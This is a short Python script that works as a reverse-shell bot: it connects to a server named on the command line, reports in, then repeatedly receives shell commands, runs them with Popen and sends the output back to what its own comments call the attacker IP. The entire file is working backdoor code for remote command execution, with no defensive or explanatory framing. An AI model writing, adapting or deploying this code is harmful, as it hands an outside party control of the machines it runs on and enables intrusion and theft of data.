import sys
from subprocess import Popen, PIPE
from socket import *


serverName = sys.argv[1]
serverPort = 8000

# Create IPv4(AF_INET), TCPSocket(Sock_Stream)

clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
clientSocket.send('Bot reporting for duty'.encode())
command = clientSocket.recv(4064).decode()

while command != "exit":
	
	# Creates a fork of the current process, and executes the command on the client.
	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
	# Reads the result of the executed command and sends the output to the attacker IP.
	result, err = proc.communicate()
	clientSocket.send(result)
	command = (clientSocket.recv(4064)).decode()

clientSocket.close()
